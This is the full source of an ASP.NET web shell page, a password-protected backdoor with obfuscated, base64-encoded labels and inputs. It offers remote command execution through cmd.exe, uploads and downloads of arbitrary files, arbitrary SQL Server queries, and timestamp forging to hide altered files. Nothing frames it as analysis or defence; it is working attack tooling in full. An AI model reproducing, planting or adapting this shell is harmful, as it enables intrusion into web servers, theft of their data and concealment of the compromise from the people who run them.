<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
 c();
NameValueCollection t=HttpContext.Current.Request.Form;
pwd=fb(t["pwd"]);pro=fb(t["pro"]);cmd=fb(t["cmd"]);sav=fb(t["sav"]);vir=t["vir"];nen=fb(t["nen"]);upb=fb(t["upb"]);upd=fb(t["upd"]);del=fb(t["del"]);don=fb(t["don"]);hid=t["hid"];tfil=fb(t["tfil"]);ttar=fb(t["ttar"]);ttim=fb(t["ttim"]);baseFile=t["baseFile"];baseAddr=fb(t["baseAddr"]);baseVir=t["baseVir"];sqc=fb(t["sqc"]);sqq=fb(t["sqq"]);
if(!string.IsNullOrEmpty(pwd))c(pwd);
else if(!string.IsNullOrEmpty(cmd))r(pro,cmd);
else if(HttpContext.Current.Request.Files["upl"]!=null)u(HttpContext.Current.Request.Files["upl"],sav,string.IsNullOrEmpty(vir)?false:true,nen);
else if(!string.IsNullOrEmpty(upb))h(upb,upd);
else if(!string.IsNullOrEmpty(del))d(del);
else if(!string.IsNullOrEmpty(don))z(don);
else if(!string.IsNullOrEmpty(tfil))g(hid,tfil,ttar,ttim);
else if(!string.IsNullOrEmpty(baseFile))baseupl(baseFile,baseAddr,string.IsNullOrEmpty(baseVir)?false:true);
else if(!string.IsNullOrEmpty(sqc))sq(sqc,sqq);

if(HttpContext.Current.Request.Cookies["data"]!=null){string data=HttpContext.Current.Request.Cookies["data"].Value;string[] data2=data.Split(new string[]{"#|#"},StringSplitOptions.None);for(int i=0;i<data2.Length;i++){string[] data3=data2[i].Split(new string[]{"#=#"},StringSplitOptions.None);
switch (data3[0]){
case"pro":pro=a(pro,fb(data3[1]));break;
case"cmd":cmd=a(cmd,fb(data3[1]));break;
case"sav":sav=a(sav,fb(data3[1]));break;
case"vir":vir=a(vir,fb(data3[1]));break;
case"nen":nen=a(nen,fb(data3[1]));break;
case"don":don=a(don,fb(data3[1]));break;
case"tfil":tfil=a(tfil,fb(data3[1]));break;
case"ttar":ttar=a(ttar,fb(data3[1]));break;
case"ttim":ttim=a(ttim,fb(data3[1]));break;
case"sqc":sqc=a(sqc,fb(data3[1]));break;
case"sqq":ttim=a(sqq,fb(data3[1]));break;
}}}

view();
    %>
<script runat="server">
string pwd,pro,cmd,sav,vir,nen,upb,upd,del,don,hid,tfil,ttar,ttim,baseFile,baseAddr,baseVir,baseName,sqc,sqq,isget;
bool aut = false;
string pp = "T0339mQiD1/fLrfrpcf2YLdUqHM=";
string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
void view(){string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}|#sqc#=#{9}|#sqq#=#{10}",
tb(pro),tb(cmd),tb(sav),tb(vir),tb(nen),tb(don),tb(tfil),tb(ttar),tb(ttim),tb(sqc),tb(sqq));
HttpCookie coo=new HttpCookie("data", data);coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);}

void c(string pwd){try{HttpCookie coo=new HttpCookie("pwd",tb(pwd));coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);aut=Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pwd)))!=pp;}catch(Exception e){l(e.Message);}}
bool c(){try{if(HttpContext.Current.Request.Cookies["pwd"]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["pwd"].Value))))==pp;return aut;}}catch(Exception e){l(e.Message);}return false;}
void u(HttpPostedFile upl, string sav, bool vir, string nen){try{if(c()){if(upl!=null&&upl.ContentLength>0){string fn=string.IsNullOrEmpty(nen)?System.IO.Path.GetFileName(upl.FileName):nen;string path=vir?Server.MapPath(sav):sav;string SaveLocation=System.IO.Path.HasExtension(path)?path:path.TrimEnd('\\')+"\\"+fn;upl.SaveAs(SaveLocation);l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
void baseupl(string baseFile,string baseAddr, bool baseVir){try{if(c()){if(baseFile!=null&&baseFile.Length>0&&!string.IsNullOrEmpty(baseAddr)){string SaveLocation=baseVir?Server.MapPath(baseAddr):baseAddr;System.IO.File.WriteAllBytes(SaveLocation,Convert.FromBase64String(baseFile));l("File uploaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
void r(string pro, string cmd){try{if(c()){System.Diagnostics.Process n=new System.Diagnostics.Process();n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);n.StartInfo.UseShellExecute=false;n.StartInfo.RedirectStandardInput=true;n.StartInfo.RedirectStandardOutput=true;n.StartInfo.RedirectStandardError=true;n.StartInfo.CreateNoWindow=true;string o=null;n.Start();n.StandardInput.WriteLine(cmd);n.StandardInput.WriteLine("exit");o=n.StandardOutput.ReadToEnd();n.WaitForExit();n.Close();l(HttpUtility.HtmlEncode(o));}}catch(Exception ex){l(ex.Message);}}
void z(string don){try{if(c()&&!string.IsNullOrEmpty(don)){byte[] f=System.IO.File.ReadAllBytes(don);System.Web.HttpContext t=System.Web.HttpContext.Current;t.Response.Clear();t.Response.ClearHeaders();t.Response.ClearContent();t.Response.AppendHeader("content-length",f.Length.ToString());t.Response.ContentType="application/octet-stream";t.Response.AppendHeader("content-disposition","attachment; filename="+don.Substring(don.LastIndexOf('\\')+1));t.Response.BinaryWrite(f);t.Response.End();}}catch(Exception ex){l(ex.Message);}}
string ti(string tt){return "Creation Time :\t\t"+System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Access Time :\t"+System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Write Time :\t"+System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");}
void g(string hid, string tfil, string ttar, string ttim){try{if(c()&&!string.IsNullOrEmpty(tfil)){l(string.Empty);if(hid=="1")ti(tfil);else if(hid=="2"){if(!string.IsNullOrEmpty(ttar)){System.IO.File.SetCreationTime(tfil,System.IO.File.GetCreationTime(ttar));System.IO.File.SetLastAccessTime(tfil,System.IO.File.GetLastAccessTime(ttar));System.IO.File.SetLastWriteTime(tfil,System.IO.File.GetLastWriteTime(ttar));l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}else if(hid=="3"){if(!string.IsNullOrEmpty(ttim)){DateTime te=DateTime.Parse(ttim);System.IO.File.SetCreationTime(tfil,te);System.IO.File.SetLastAccessTime(tfil,te);System.IO.File.SetLastWriteTime(tfil,te);l("Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil));}}}}catch(Exception ex){l(ex.Message);}}
void h(string upb, string upd){try{if(c()&&!string.IsNullOrEmpty(upb)&&!string.IsNullOrEmpty(upd)){System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath()+upd,Convert.FromBase64String(upb));l(upd+" successfuly uploaded");}}catch(Exception ex){l(ex.Message);}}
void d(string del){try{if(c()&&!string.IsNullOrEmpty(del)){System.IO.File.Delete(System.IO.Path.GetTempPath()+del);l(del+" successfuly deleled");}}catch(Exception ex){l(ex.Message);}}
void sq(string sqc, string sqq){try{if(c()){if(!string.IsNullOrEmpty(sqc)){using(System.Data.SqlClient.SqlConnection con=new System.Data.SqlClient.SqlConnection(sqc)){if(string.IsNullOrEmpty(sqq)){try{con.Open();l("Sql Server Connection Successfuly Established");}catch(Exception ex){l("Sql Server Connection Failed :"+Environment.NewLine+ex.ToString());}}else{try{con.Open();System.Data.SqlClient.SqlCommand com=new System.Data.SqlClient.SqlCommand(sqq,con);System.Data.SqlClient.SqlDataAdapter ad=new System.Data.SqlClient.SqlDataAdapter(com);System.Data.DataTable dt=new System.Data.DataTable();ad.Fill(dt);DataGrid grid=new DataGrid();System.Web.UI.WebControls.DataList list=new System.Web.UI.WebControls.DataList();grid.DataSource=dt;grid.DataBind();log.Controls.Add(grid);}catch(Exception ex){l("Error : <br>"+ex.ToString());}}con.Close();}}}}catch(Exception ex){l(ex.Message);}}
string x(string f){return Encoding.UTF8.GetString(Convert.FromBase64String(f));}
void l(string ll){log.InnerHtml=tb(ll);}

</script>

<style>body,html{margin:0;padding:3px 0 0 3px;direction:ltr;background:#000;color:#fff !important;}form{margin:0;}*{font:14px "Lucida Console";}t{width:180px;display:inline-block;text-align:right;padding-right:5px;}g{margin-left:30px;}input[type="text"],input[type="file"],textarea {width:50%;height:25px;background:#444;color:#fff;border:1px solid #999;margin-bottom:3px;}input[type="text"]{padding:2px;}input[type="button"],input[type="submit"] {height:23px;}input[type="checkbox"]{width:23px;height:24px;position:absolute;margin:0;}hr{margin:0;border:0;border-top:1px solid #DDD;}.h{width:100px;text-align:center;background:rgba(19, 96, 0, 1);vertical-align:middle;}table{width:100%;margin:0;border-collapse:collapse;}.b{padding:10px 0px 9px;}</style>
<script>
function use() { var n = document; var d = n.getElementById("d").innerHTML; d = d.substring(0, d.lastIndexOf('\\') + 1); n.getElementsByName("cmd")[0].value += d; n.getElementsByName("sav")[0].value += d; n.getElementsByName("don")[0].value += d; }
function subm(){var mmm=document.getElementsByClassName('mmm');for(var i=0;i<mmm.length;i++){mmm[i].value=btoa(mmm[i].value);}}
function reset() { document.cookie = "data=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/";location.href = location.pathname;}
</script>
</head>
<body>
<table>
<tr>
<td class="h"><%=x("QWRkcmVzcw==")%></td>
<td class="b">
<t><%=x("Q3VycmVudA==")%> :</t>
<y id="d"><%= Server.MapPath(string.Empty) + "\\"%></y>
<input type="button" value="<%=x("VXNl")%>" onclick="use()" />
<input type="button" value="<%=x("UmVzZXQgRm9ybQ==")%>" onclick="reset()" />
</td>
</tr>
</table>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("TG9naW4=")%></td>
<td class="b">
<t><%=x("RG8gaXQ=")%> :</t>
<input name="pwd" class="mmm" type="text" style='background-color: <%= aut ? "Green" : "Red" %>' />
<input type="submit" value="<%= x("RG8gaXQ=") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("Q29tbWFuZA==")%></td>
<td class="b">
<t><%=x("UHJvY2Vzcw==")%> :</t>
<input name="pro" class="mmm" type="text" value='<%= string.IsNullOrEmpty(pro) ? x("Y21kLmV4ZQ==") : pro %>' /><br>
<t><%=x("Q29tbWFuZA==")%> :</t>
<input name="cmd" class="mmm" type="text" value='<%= cmd %>' />
<input type="submit" value="<%= x("RXhlY3V0ZQ==") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post" enctype="multipart/form-data">
<table>
<tr>
<td class="h"><%=x("VXBsb2Fk")%></td>
<td class="b">
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="upl" type="file" /><br>
<t><%=x("U2F2ZSBhcw==")%> :</t>
<input name="sav" class="mmm" type="text" value='<%= sav %>' />
<input name="vir" type="checkbox" /><g><%=x("SXMgdmlydHVhbCBwYXRo")%></g><br>
<t><%=x("TmV3IEZpbGUgbmFtZQ==")%> :</t>
<input name="nen" class="mmm" type="text" value='<%= nen %>' />
<input type="submit" value="<%= x("VXBsb2Fk") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("RG93bmxvYWQ=")%></td>
<td class="b">
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="don" type="text" />
<input type="submit" value="<%= x("RG93bmxvYWQ=") %>" onclick="document.getElementsByName('don')[0].value = btoa(document.getElementsByName('don')[0].value);" />
</td>
</tr>
</table>
</form>
<hr />
<form method="post">
<table>
<tr>
<td class="h"><%=x("VXBsb2FkIEJhc2U2NA==")%></td>
<td class="b">
<t><%=x("QmFzZTY0IEZpbGU=")%> :</t>
<textarea name="baseFile"></textarea>
<input name="baseVir" type="checkbox" /><g><%=x("SXMgdmlydHVhbCBwYXRo")%></g><br>
<t><%=x("RmlsZSBQYXRoIGFuZCBOYW1l ")%> :</t>
<input name="baseAddr" class="mmm" type="text" value='<%= baseAddr %>' />
<input type="submit" value="<%= x("VXBsb2Fk") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr />
<form method="post">
<table>
<tr>
<td class="h"><%=x("U3FsIFNlcnZlcg==")%></td>
<td class="b">
<input style="margin:0 0 3px 192px" type="button" value="<%=x("U3RhbmRhcmQgQ29ubmVjdGlvbiBTYW1wbGU=")%>" onclick="document.getElementsByName('sqc')[0].value = '<%=x("U2VydmVyPS47RGF0YWJhc2U9ZGI7VXNlciBJZD11c2VyO1Bhc3N3b3JkPXBhc3M=")%>'" />
<input style="margin:0 0 3px 0" type="button" value="<%=x("VHJ1c3RlZCBDb25uZWN0aW4gU2FtcGxl")%>" onclick="document.getElementsByName('sqc')[0].value = '<%=x("U2VydmVyPS47RGF0YWJhc2U9ZGI7VHJ1c3RlZF9Db25uZWN0aW9uPVRydWU=")%>'" /><br />
<t><%=x("Q29ubmVjdGlvbiBTdHJpbmc=")%> :</t>
<input name="sqc" class="mmm" type="text" value='<%= sqc %>' /><br />
<t><%=x("UXVlcnk=")%> :</t>
<textarea name="sqq" class="mmm"><%= sqq %></textarea>
<input type="submit" value="<%= x("UnVu") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr />
<form method="post">
<table>
<tr>
<td class="h"><%=x("Q2hhbmdlIENyZWF0aW9uIFRpbWU=")%></td>
<td class="b">
<input name="hid" type="hidden" />
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="tfil" class="mmm" type="text" value='<%= tfil %>' />
<input type="submit" value="<%= x("R2V0") %>" onclick="subm(); document.getElementsByName('hid')[0].value = '1'" /><br>
<t><%=x("RnJvbSBUaGlzIEZpbGU=")%> :</t>
<input name="ttar" class="mmm" type="text" value='<%= ttar %>' />
<input type="submit" value="<%= x("U2V0") %>" onclick="subm(); document.getElementsByName('hid')[0].value = '2'" /><br>
<t><%=x("TmV3IFRpbWU=")%> :</t>
<input name="ttim" class="mmm" type="text" value='<%= ttim %>' />
<input type="submit" value="<%= x("U2V0") %>" onclick="subm(); document.getElementsByName('hid')[0].value = '3'" />
</td>
</tr>
</table>
</form>
<hr />
<br />
<pre id="log" runat="server"></pre>
<script>var ll=document.getElementById('log');if(ll.innerHTML)ll.innerHTML=atob(log.innerHTML);</script>
</body>
</html>
